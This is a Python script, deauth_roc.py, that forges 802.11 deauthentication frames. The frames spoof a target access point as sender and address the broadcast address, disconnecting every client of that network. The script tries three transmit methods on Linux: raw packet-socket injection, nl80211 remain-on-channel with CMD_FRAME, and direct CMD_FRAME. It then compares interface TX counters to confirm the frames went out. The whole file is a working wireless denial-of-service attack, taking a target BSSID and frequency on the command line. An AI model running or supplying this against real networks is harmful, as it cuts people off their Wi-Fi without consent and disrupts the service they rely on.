#!/usr/bin/env python3
"""
deauth_roc.py - Deauth TX using Remain-on-Channel + CMD_FRAME
Uses nl80211 ROC to establish offchannel, then sends deauth frames.
Also tries direct packet socket TX in STA mode.

Usage: python3 deauth_roc.py <iface> <target_bssid> <freq> [count]
"""
import socket, struct, fcntl, sys, time, os

NETLINK_GENERIC = 16
NLM_F_REQUEST = 1
NLM_F_ACK = 4

def nla(atype, data):
    alen = 4 + len(data)
    pad = (4 - alen % 4) % 4
    return struct.pack('<HH', alen, atype) + data + b'\x00' * pad

def nla_nest(atype, inner):
    alen = 4 + len(inner)
    pad = (4 - alen % 4) % 4
    return struct.pack('<HH', alen, atype) + inner + b'\x00' * pad

def nl_send(sock, fid, cmd, attrs, flags=NLM_F_REQUEST|NLM_F_ACK):
    genlhdr = struct.pack('BBH', cmd, 1, 0)
    payload = genlhdr + attrs
    nlhdr = struct.pack('<IHHII', 16 + len(payload), fid, flags, int(time.time()) & 0x7FFFFFFF, 0)
    sock.send(nlhdr + payload)

def nl_recv(sock, timeout=3):
    sock.settimeout(timeout)
    try:
        data = sock.recv(16384)
    except socket.timeout:
        return None
    return data

def parse_nl_error(data):
    if len(data) >= 20:
        nllen, nltype = struct.unpack_from('<IH', data, 0)
        if nltype == 2:  # NLMSG_ERROR
            err = struct.unpack_from('<i', data, 16)[0]
            return err
    return None

def get_nl80211_family_id(sock):
    attr = nla(2, b'nl80211\x00')
    genlhdr = struct.pack('BBH', 3, 1, 0)  # CTRL_CMD_GETFAMILY
    nlhdr = struct.pack('<IHHII', 16 + 4 + len(attr), 16, NLM_F_REQUEST, 1, 0)
    sock.send(nlhdr + genlhdr + attr)
    resp = sock.recv(8192)
    # Parse response for family ID (attr type 1)
    off = 16 + 4  # skip nlhdr + genlhdr
    nllen = struct.unpack_from('<I', resp, 0)[0]
    while off < nllen:
        alen, atype = struct.unpack_from('<HH', resp, off)
        if alen < 4:
            break
        if atype == 1:
            return struct.unpack_from('<H', resp, off + 4)[0]
        off += (alen + 3) & ~3
    return None

def get_ifindex(ifname):
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    ifidx = struct.unpack('i', fcntl.ioctl(s.fileno(), 0x8933,
                          struct.pack('256s', ifname.encode()))[16:20])[0]
    s.close()
    return ifidx

def build_deauth_frame(da, sa, bssid, reason=7):
    fc = struct.pack('<H', 0x00C0)  # Deauth
    dur = struct.pack('<H', 0)
    seq = struct.pack('<H', 0)
    rsn = struct.pack('<H', reason)
    return fc + dur + da + sa + bssid + seq + rsn

def try_packet_socket_injection(ifname, frame, count=10):
    """Try raw packet socket injection (like aireplay-ng does)"""
    print(f"\n=== Method 1: Raw Packet Socket ===")

    # Radiotap header for TX
    # Simple radiotap: just version + pad + length + present flags
    radiotap = struct.pack('<BBHI', 0, 0, 8, 0)  # 8 byte minimal radiotap

    try:
        sock = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.htons(3))
        sock.bind((ifname, 0))

        pkt = radiotap + frame
        sent = 0
        errors = 0
        for i in range(count):
            try:
                sock.send(pkt)
                sent += 1
            except OSError as e:
                errors += 1
                if i == 0:
                    print(f"  Send error: {e}")

        print(f"  Sent: {sent}/{count}, Errors: {errors}")
        sock.close()
        return sent > 0
    except Exception as e:
        print(f"  Failed: {e}")
        return False

def try_nl80211_roc_tx(ifname, ifidx, fid, frame, freq, count=10):
    """Try nl80211 ROC + CMD_FRAME"""
    print(f"\n=== Method 2: ROC + CMD_FRAME ===")

    sock = socket.socket(socket.AF_NETLINK, socket.SOCK_RAW, NETLINK_GENERIC)
    sock.bind((0, 0))

    # Step 1: Start Remain-on-Channel
    # CMD_REMAIN_ON_CHANNEL = 55
    roc_attrs = nla(3, struct.pack('<I', ifidx))  # NL80211_ATTR_IFINDEX
    roc_attrs += nla(69, struct.pack('<I', freq))  # NL80211_ATTR_WIPHY_FREQ
    roc_attrs += nla(70, struct.pack('<I', 5000))  # NL80211_ATTR_DURATION (5000ms)

    print(f"  Starting ROC on {freq} MHz for 5000ms...")
    nl_send(sock, fid, 55, roc_attrs)
    resp = nl_recv(sock, 5)
    if resp:
        err = parse_nl_error(resp)
        if err is not None and err != 0:
            print(f"  ROC error: {err}")
            # Continue anyway - might not need ROC for STA mode
        elif err == 0:
            print(f"  ROC: ACK received")
            # Wait for ROC started event
            time.sleep(0.5)
        else:
            print(f"  ROC: response type={struct.unpack_from('<H', resp, 4)[0]}")
    else:
        print(f"  ROC: no response")

    # Step 2: Send CMD_FRAME
    # CMD_FRAME = 59
    sent = 0
    errors = 0
    for i in range(count):
        frame_attrs = nla(3, struct.pack('<I', ifidx))   # IFINDEX
        frame_attrs += nla(38, struct.pack('<I', freq))   # WIPHY_FREQ
        frame_attrs += nla(51, frame)                     # FRAME
        frame_attrs += nla(118, b'')                      # DONT_WAIT_FOR_ACK

        nl_send(sock, fid, 59, frame_attrs)
        resp = nl_recv(sock, 1)
        if resp:
            err = parse_nl_error(resp)
            if err is not None and err != 0:
                errors += 1
                if i == 0:
                    print(f"  CMD_FRAME error: {err}")
            else:
                sent += 1
        else:
            errors += 1

    print(f"  Sent: {sent}/{count}, Errors: {errors}")

    # Cancel ROC
    # CMD_CANCEL_REMAIN_ON_CHANNEL = 56
    # (just let it expire)

    sock.close()
    return sent > 0

def try_nl80211_direct(ifname, ifidx, fid, frame, freq, count=10):
    """Try nl80211 CMD_FRAME without ROC"""
    print(f"\n=== Method 3: Direct CMD_FRAME (no ROC) ===")

    sock = socket.socket(socket.AF_NETLINK, socket.SOCK_RAW, NETLINK_GENERIC)
    sock.bind((0, 0))

    sent = 0
    errors = 0
    for i in range(count):
        frame_attrs = nla(3, struct.pack('<I', ifidx))   # IFINDEX
        frame_attrs += nla(38, struct.pack('<I', freq))   # WIPHY_FREQ
        frame_attrs += nla(51, frame)                     # FRAME
        frame_attrs += nla(118, b'')                      # DONT_WAIT_FOR_ACK

        nl_send(sock, fid, 59, frame_attrs)
        resp = nl_recv(sock, 1)
        if resp:
            err = parse_nl_error(resp)
            if err is not None and err != 0:
                errors += 1
                if i == 0:
                    print(f"  CMD_FRAME error: {err}")
            else:
                sent += 1
        else:
            errors += 1

    print(f"  Sent: {sent}/{count}, Errors: {errors}")
    sock.close()
    return sent > 0

def check_tx_stats(ifname):
    """Check TX counters to see if frames actually went out"""
    stats = {}
    try:
        with open(f'/sys/class/net/{ifname}/statistics/tx_packets') as f:
            stats['tx_packets'] = int(f.read().strip())
        with open(f'/sys/class/net/{ifname}/statistics/tx_bytes') as f:
            stats['tx_bytes'] = int(f.read().strip())
        with open(f'/sys/class/net/{ifname}/statistics/tx_errors') as f:
            stats['tx_errors'] = int(f.read().strip())
    except:
        pass
    return stats

def main():
    if len(sys.argv) < 4:
        print(f"Usage: {sys.argv[0]} <iface> <target_bssid> <freq> [count]")
        sys.exit(1)

    ifname = sys.argv[1]
    bssid = bytes.fromhex(sys.argv[2].replace(':', ''))
    freq = int(sys.argv[3])
    count = int(sys.argv[4]) if len(sys.argv) > 4 else 10

    ifidx = get_ifindex(ifname)
    print(f"Interface: {ifname} (idx={ifidx})")
    print(f"Target: {sys.argv[2]}, Freq: {freq} MHz, Count: {count}")

    # Build deauth frame: SA=target AP, DA=broadcast, BSSID=target AP
    da = b'\xff\xff\xff\xff\xff\xff'
    frame = build_deauth_frame(da, bssid, bssid, reason=7)
    print(f"Frame: {frame.hex()}")

    # Get nl80211 family ID
    sock = socket.socket(socket.AF_NETLINK, socket.SOCK_RAW, NETLINK_GENERIC)
    sock.bind((0, 0))
    fid = get_nl80211_family_id(sock)
    sock.close()
    print(f"nl80211 family ID: {fid}")

    if fid is None:
        print("ERROR: Could not get nl80211 family ID")
        sys.exit(1)

    # Check TX stats before
    stats_before = check_tx_stats(ifname)
    print(f"\nTX stats before: {stats_before}")

    # Method 1: Raw packet socket
    try_packet_socket_injection(ifname, frame, count)

    stats_after1 = check_tx_stats(ifname)
    print(f"TX stats after Method 1: {stats_after1}")

    # Method 2: ROC + CMD_FRAME
    try_nl80211_roc_tx(ifname, ifidx, fid, frame, freq, count)

    stats_after2 = check_tx_stats(ifname)
    print(f"TX stats after Method 2: {stats_after2}")

    # Method 3: Direct CMD_FRAME
    try_nl80211_direct(ifname, ifidx, fid, frame, freq, count)

    stats_after3 = check_tx_stats(ifname)
    print(f"TX stats after Method 3: {stats_after3}")

    # Summary
    print(f"\n=== TX Counter Summary ===")
    if stats_before and stats_after3:
        d_pkts = stats_after3.get('tx_packets', 0) - stats_before.get('tx_packets', 0)
        d_bytes = stats_after3.get('tx_bytes', 0) - stats_before.get('tx_bytes', 0)
        d_err = stats_after3.get('tx_errors', 0) - stats_before.get('tx_errors', 0)
        print(f"Total new TX: {d_pkts} packets, {d_bytes} bytes, {d_err} errors")

if __name__ == '__main__':
    main()
